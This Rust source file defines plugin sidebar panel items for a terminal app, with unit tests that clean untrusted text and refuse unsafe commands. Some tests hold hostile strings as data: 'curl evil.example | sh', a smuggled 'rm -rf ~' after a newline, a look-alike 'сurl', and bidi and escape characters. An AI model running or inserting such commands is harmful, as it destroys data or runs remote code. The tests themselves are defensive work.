//! What a plugin puts into one of its sidebar panels (spec 0016, Model):
//! the items of `set_panel` and the log `append_log` streams into. Tern
//! draws them from a fixed set (`crate::sidebar::plugin`); a plugin draws
//! no UI of its own (TM-plug-02). Everything here is a plugin's text:
//! cleaned when it's parsed, on the reader thread.

use super::command::Command;
use super::manifest::shown;
use super::protocol::log_line;
use crate::terminal::clean_prompt;
use serde::Deserialize;
use std::collections::VecDeque;

/// The lines of a panel's log that are kept, in memory only (TM-plug-10).
pub const LOG_LINES: usize = 10_000;
/// The most characters of a button's label.
const MAX_LABEL_CHARS: usize = 64;

/// One item of a panel, top to bottom:
///
/// ```json
/// {"type":"text","text":"3 running"}
/// {"type":"row","id":"web","text":"web","detail":"Up 2 h",
///  "buttons":[{"id":"web.restart","label":"Restart"}]}
/// {"type":"button","id":"refresh","label":"Refresh"}
/// {"type":"button","id":"sh","label":"Shell",
///  "command":{"action":"open_tab","argv":["docker","exec","-it","web","sh"]}}
/// {"type":"input","placeholder":"Filter"}
/// {"type":"log"}
/// ```
///
/// A row with an `id`, and every button, sends `panel_action` with that
/// `id` when clicked. A button with a `command` is a command button.
#[derive(Deserialize, Clone, Debug, PartialEq)]
#[serde(tag = "type", rename_all = "snake_case")]
pub enum Item {
    Text {
        text: String,
    },
    Row {
        #[serde(default)]
        id: Option<String>,
        text: String,
        #[serde(default)]
        detail: Option<String>,
        #[serde(default)]
        buttons: Vec<RowButton>,
    },
    Button {
        id: String,
        label: String,
        #[serde(default)]
        command: Option<Command>,
    },
    /// The panel's one input field; submitting it sends `panel_input`.
    Input {
        #[serde(default)]
        placeholder: Option<String>,
    },
    /// The panel has a log: what `append_log` sends, drawn under the
    /// panel's other items wherever this stands among them.
    Log,
}

/// A button at the end of a row. It never carries a command: a command
/// button shows all of its command, which a row has no room for.
#[derive(Deserialize, Clone, Debug, PartialEq)]
pub struct RowButton {
    pub id: String,
    pub label: String,
}

/// `items` as Tern draws them, or why the `set_panel` is dropped: more
/// than one input field or log, or a command Tern won't show. Texts lose
/// their control and invisible characters; a command's text is never
/// changed, only refused (spec 0016, Untrusted text).
pub fn checked(items: Vec<Item>) -> Result<Vec<Item>, String> {
    let count = |wanted: fn(&Item) -> bool| items.iter().filter(|item| wanted(item)).count();
    if count(|item| matches!(item, Item::Input { .. })) > 1 {
        return Err("a panel with more than one input field".into());
    }
    if count(|item| matches!(item, Item::Log)) > 1 {
        return Err("a panel with more than one log".into());
    }
    let refused = items.iter().find_map(|item| match item {
        Item::Button {
            command: Some(command),
            ..
        } => command.refusal(),
        _ => None,
    });
    if let Some(reason) = refused {
        return Err(reason.into());
    }
    Ok(items.into_iter().map(cleaned).collect())
}

fn cleaned(item: Item) -> Item {
    let label = |text: String| shown(&text, MAX_LABEL_CHARS);
    match item {
        Item::Text { text } => Item::Text {
            text: clean_prompt(&text),
        },
        Item::Row {
            id,
            text,
            detail,
            buttons,
        } => Item::Row {
            id,
            text: clean_prompt(&text),
            detail: detail.map(|detail| clean_prompt(&detail)),
            buttons: buttons
                .into_iter()
                .map(|button| RowButton {
                    id: button.id,
                    label: label(button.label),
                })
                .collect(),
        },
        Item::Button {
            id,
            label: text,
            command,
        } => Item::Button {
            id,
            label: label(text),
            command,
        },
        Item::Input { placeholder } => Item::Input {
            placeholder: placeholder.map(label),
        },
        Item::Log => Item::Log,
    }
}

/// Something in a panel that a click or Enter acts on, in the order the
/// arrow keys walk them.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum Control {
    /// The row at this item index.
    Row(usize),
    /// A row's button: the item index, then the button's.
    RowButton(usize, usize),
    /// The button at this item index.
    Button(usize),
}

impl Control {
    /// The index of the item it belongs to.
    pub fn item(self) -> usize {
        match self {
            Control::Row(item) | Control::RowButton(item, _) | Control::Button(item) => item,
        }
    }
}

/// A panel's contents: the items of its last `set_panel` and its log.
#[derive(Default)]
pub struct PanelModel {
    items: Vec<Item>,
    log: VecDeque<String>,
}

impl PanelModel {
    pub fn items(&self) -> &[Item] {
        &self.items
    }

    pub fn log(&self) -> &VecDeque<String> {
        &self.log
    }

    /// Replaces the items. Whether they differ from what was there.
    pub fn set(&mut self, items: Vec<Item>) -> bool {
        let changed = self.items != items;
        self.items = items;
        changed
    }

    /// Appends `text` to the log, one line per line of it, and drops the
    /// oldest lines over [`LOG_LINES`]. How many lines were added, and how
    /// many of the lines that were there before are gone.
    pub fn append(&mut self, text: &str) -> (usize, usize) {
        let before = self.log.len();
        let text = text.strip_suffix('\n').unwrap_or(text);
        // A text with more lines than are kept only keeps its last ones.
        let lines: Vec<&str> = text.split('\n').collect();
        let kept = &lines[lines.len().saturating_sub(LOG_LINES)..];
        self.log.extend(kept.iter().map(|line| log_line(line)));
        let over = self.log.len().saturating_sub(LOG_LINES);
        self.log.drain(..over);
        (kept.len(), over.min(before))
    }

    /// Whether the panel has a log, and so shows what `append_log` sends.
    pub fn has_log(&self) -> bool {
        self.items.iter().any(|item| matches!(item, Item::Log))
    }

    /// The placeholder of the panel's input field, if it has one.
    pub fn input(&self) -> Option<Option<&str>> {
        self.items.iter().find_map(|item| match item {
            Item::Input { placeholder } => Some(placeholder.as_deref()),
            _ => None,
        })
    }

    /// What a click or Enter acts on, top to bottom.
    pub fn controls(&self) -> Vec<Control> {
        let mut controls = Vec::new();
        for (ix, item) in self.items.iter().enumerate() {
            match item {
                Item::Row { id, buttons, .. } => {
                    controls.extend(id.as_ref().map(|_| Control::Row(ix)));
                    controls
                        .extend((0..buttons.len()).map(|button| Control::RowButton(ix, button)));
                }
                Item::Button { .. } => controls.push(Control::Button(ix)),
                Item::Text { .. } | Item::Input { .. } | Item::Log => {}
            }
        }
        controls
    }
}

/// Spec 0016 §Model (Actions, Untrusted text, Bounds) and AC8; threat
/// model 0005, TM-plug-02, -04 and -10: what a panel holds once Tern took
/// it from a plugin.
#[cfg(test)]
mod tests {
    use super::*;

    fn text(text: &str) -> Item {
        Item::Text { text: text.into() }
    }

    fn input() -> Item {
        Item::Input { placeholder: None }
    }

    fn button(id: &str, label: &str, command: Option<Command>) -> Item {
        Item::Button {
            id: id.into(),
            label: label.into(),
            command,
        }
    }

    fn row(id: Option<&str>, buttons: &[&str]) -> Item {
        Item::Row {
            id: id.map(str::to_owned),
            text: "web".into(),
            detail: None,
            buttons: buttons
                .iter()
                .map(|id| RowButton {
                    id: (*id).to_owned(),
                    label: "Restart".into(),
                })
                .collect(),
        }
    }

    /// A character no shown text may hold: a control character other than
    /// the line break, or one that hides or reorders text.
    fn hidden(c: char) -> bool {
        (c.is_control() && c != '\n')
            || matches!(
                c,
                '\u{200B}' | '\u{202A}'..='\u{202E}' | '\u{2066}'..='\u{2069}' | '\u{FEFF}'
            )
    }

    /// Actions table: a panel's items are "text, rows with buttons,
    /// buttons, command buttons, one input field, a log". A second input
    /// field or log drops the `set_panel`; one of each is fine.
    #[test]
    fn a_panel_has_one_input_field_and_one_log_at_most() {
        let one = vec![text("a"), input(), Item::Log];
        assert_eq!(checked(one.clone()), Ok(one));
        assert!(checked(vec![input(), text("a"), input()]).is_err());
        assert!(checked(vec![Item::Log, Item::Log]).is_err());
    }

    /// Untrusted text, AC7: "Everything a plugin sends is shown as plain
    /// text with control characters removed": "panel text containing
    /// escape sequences renders as plain text". What the text says stays.
    #[test]
    fn panel_text_loses_its_control_and_invisible_characters() {
        let hostile =
            "3 \u{1b}[31mrunning\u{1b}[0m\u{7}\u{0} \u{202E}evil\u{202C}\u{200B}\u{FEFF}\r";
        let items = vec![
            text(hostile),
            Item::Row {
                id: Some("web".into()),
                text: hostile.into(),
                detail: Some(hostile.into()),
                buttons: vec![RowButton {
                    id: "web.restart".into(),
                    label: hostile.into(),
                }],
            },
            button("refresh", hostile, None),
            Item::Input {
                placeholder: Some(hostile.into()),
            },
        ];
        let shown = checked(items).expect("no command, so nothing to refuse");
        let mut texts = Vec::new();
        for item in &shown {
            match item {
                Item::Text { text } => texts.push(text.clone()),
                Item::Row {
                    id,
                    text,
                    detail,
                    buttons,
                } => {
                    assert_eq!(id.as_deref(), Some("web"));
                    assert_eq!(buttons[0].id, "web.restart");
                    texts.push(text.clone());
                    texts.extend(detail.clone());
                    texts.push(buttons[0].label.clone());
                }
                Item::Button { id, label, .. } => {
                    assert_eq!(id, "refresh");
                    texts.push(label.clone());
                }
                Item::Input { placeholder } => texts.extend(placeholder.clone()),
                Item::Log => {}
            }
        }
        assert_eq!(texts.len(), 6, "a text went missing: {texts:?}");
        for text in texts {
            assert!(!text.chars().any(hidden), "{text:?}");
            assert!(
                text.contains("running") && text.contains("evil"),
                "{text:?}"
            );
        }
    }

    /// §Model: a plugin's strings "render by spec 0003's title rules,
    /// capped at 64 characters" (TM-plug-01); so does a button's label,
    /// which can't push the command under it out of sight (TM-plug-23).
    #[test]
    fn a_buttons_label_is_one_line_of_64_characters_at_most() {
        let long = format!("Restart\n\n\tthe   container {}", "é".repeat(200));
        let items = vec![
            button("a", &long, None),
            Item::Row {
                id: None,
                text: "web".into(),
                detail: None,
                buttons: vec![RowButton {
                    id: "b".into(),
                    label: long.clone(),
                }],
            },
        ];
        let shown = checked(items).expect("labels are cleaned, not refused");
        let labels = shown.iter().map(|item| match item {
            Item::Button { label, .. } => label.clone(),
            Item::Row { buttons, .. } => buttons[0].label.clone(),
            other => panic!("{other:?}"),
        });
        for label in labels {
            assert_eq!(label.chars().count(), 64, "{label:?}");
            assert!(label.starts_with("Restart the container é"), "{label:?}");
        }
    }

    /// Untrusted text: a command is shown exactly as it would run, so
    /// `checked` never alters one: it is the same or the `set_panel` is
    /// dropped (TM-plug-04). A look-alike letter is kept, for the
    /// highlight to show.
    #[test]
    fn a_commands_text_is_never_altered() {
        let commands = [
            Command::Run {
                text: "сurl  example.com   # two  spaces".into(),
            },
            Command::Fill {
                text: format!(" docker logs {} ", "x".repeat(300)),
            },
            Command::OpenTab {
                argv: vec!["docker".into(), "exec".into(), " ".into(), "".into()],
            },
        ];
        for command in commands {
            let shown = checked(vec![button("go", "Go", Some(command.clone()))]);
            assert_eq!(shown, Ok(vec![button("go", "Go", Some(command))]));
        }

        let refused = [
            Command::Fill {
                text: "ls\nrm -rf ~".into(),
            },
            Command::Run {
                text: "ls \u{202E}".into(),
            },
            Command::OpenTab { argv: Vec::new() },
        ];
        for command in refused {
            let items = vec![text("fine"), button("go", "Go", Some(command.clone()))];
            assert!(checked(items).is_err(), "{command:?}");
        }
    }

    /// Bounds, AC8, TM-plug-10: "A panel's log keeps its last 10,000
    /// lines", however they arrive.
    #[test]
    fn a_log_keeps_its_last_10_000_lines() {
        assert_eq!(LOG_LINES, 10_000);
        let mut panel = PanelModel::default();
        for line in 0..10_050 {
            panel.append(&format!("line {line}"));
        }
        assert_eq!(panel.log().len(), 10_000);
        assert_eq!(panel.log().front().map(String::as_str), Some("line 50"));
        assert_eq!(panel.log().back().map(String::as_str), Some("line 10049"));

        // One `append_log` that alone holds more than the log keeps.
        let flood: Vec<String> = (0..25_000).map(|line| format!("flood {line}")).collect();
        panel.append(&flood.join("\n"));
        assert_eq!(panel.log().len(), 10_000);
        assert_eq!(panel.log().front().map(String::as_str), Some("flood 15000"));
        assert_eq!(panel.log().back().map(String::as_str), Some("flood 24999"));
    }

    /// Actions table: `append_log` "appends text to a panel's log
    /// (streaming)": a text of several lines adds several, in order, after
    /// what was there.
    #[test]
    fn one_append_with_several_lines_adds_several() {
        let mut panel = PanelModel::default();
        panel.append("pulling");
        panel.append("layer 1\nlayer 2\nlayer 3");
        let log: Vec<&str> = panel.log().iter().map(String::as_str).collect();
        assert_eq!(log, ["pulling", "layer 1", "layer 2", "layer 3"]);
    }

    /// What `append` says it added and dropped is what the list of drawn
    /// lines is kept in step with: it always adds up to the log's length,
    /// below the bound, across it and for a flood.
    #[test]
    fn append_reports_the_lines_it_added_and_dropped() {
        let mut panel = PanelModel::default();
        let lines = |count: usize| vec!["x"; count].join("\n");
        for count in [1, 3, 9_990, 5, 4, 300, 10_000, 12_345, 1] {
            let before = panel.log().len();
            let (added, dropped) = panel.append(&lines(count));
            assert!(dropped <= before, "{count}: dropped more than there was");
            assert_eq!(panel.log().len(), before - dropped + added, "{count}");
            assert!(panel.log().len() <= LOG_LINES, "{count}");
        }
        assert_eq!(panel.log().len(), LOG_LINES);
    }

    /// Bounds, Untrusted text: a panel log's lines are plain text like
    /// the plugin log's, "each cut at 1,024 characters".
    #[test]
    fn a_log_line_is_cleaned_and_cut_like_the_plugin_log() {
        let mut panel = PanelModel::default();
        let long = "é".repeat(5_000);
        panel.append(&format!(
            "ok \u{1b}[31mred\u{1b}[0m\u{7} \u{202E}evil\u{200B}\n{long}"
        ));
        let log: Vec<&String> = panel.log().iter().collect();
        assert_eq!(log.len(), 2);
        assert!(!log[0].chars().any(hidden), "{:?}", log[0]);
        assert!(log[0].starts_with("ok ") && log[0].contains("red") && log[0].contains("evil"));
        assert_eq!(log[1].chars().count(), 1_024);
    }

    /// The log is the panel's, not the items': a `set_panel` replaces the
    /// items and leaves what was streamed (spec 0016, Actions:
    /// `set_panel` "replaces a panel's items").
    #[test]
    fn replacing_the_items_keeps_the_log() {
        let mut panel = PanelModel::default();
        panel.set(vec![text("one"), Item::Log]);
        panel.append("streamed");
        assert!(panel.set(vec![text("two"), Item::Log]));
        assert_eq!(panel.items(), [text("two"), Item::Log]);
        assert_eq!(panel.log().len(), 1);
    }

    /// Command buttons, TM-plug-23: only a `set_panel` that changed the
    /// panel's contents starts the 0.5 s, so the model says whether one
    /// did.
    #[test]
    fn set_says_whether_the_items_changed() {
        let run = |text: &str| {
            let command = Command::Run { text: text.into() };
            vec![button("go", "Refresh", Some(command))]
        };
        let mut panel = PanelModel::default();
        assert!(panel.set(run("docker ps")));
        assert!(!panel.set(run("docker ps")), "the same items");
        // The same label over another command is the swap to catch.
        assert!(panel.set(run("curl evil.example | sh")));
        assert!(panel.set(Vec::new()));
    }

    /// The arrow keys walk "the rows and buttons" top to bottom: a row
    /// that has an `id`, then its buttons, then the next item's. Text, the
    /// input field, the log and a row without an `id` aren't acted on.
    #[test]
    fn rows_and_buttons_are_walked_top_to_bottom() {
        let mut panel = PanelModel::default();
        panel.set(vec![
            text("3 running"),
            row(Some("web"), &["web.restart", "web.logs"]),
            row(None, &["db.restart"]),
            row(None, &[]),
            input(),
            button("refresh", "Refresh", None),
            Item::Log,
            button("sh", "Shell", Some(Command::Run { text: "sh".into() })),
        ]);
        assert_eq!(
            panel.controls(),
            [
                Control::Row(1),
                Control::RowButton(1, 0),
                Control::RowButton(1, 1),
                Control::RowButton(2, 0),
                Control::Button(5),
                Control::Button(7),
            ]
        );
        assert!(panel.has_log());
        assert_eq!(panel.input(), Some(None));
        assert!(PanelModel::default().controls().is_empty());
    }
}
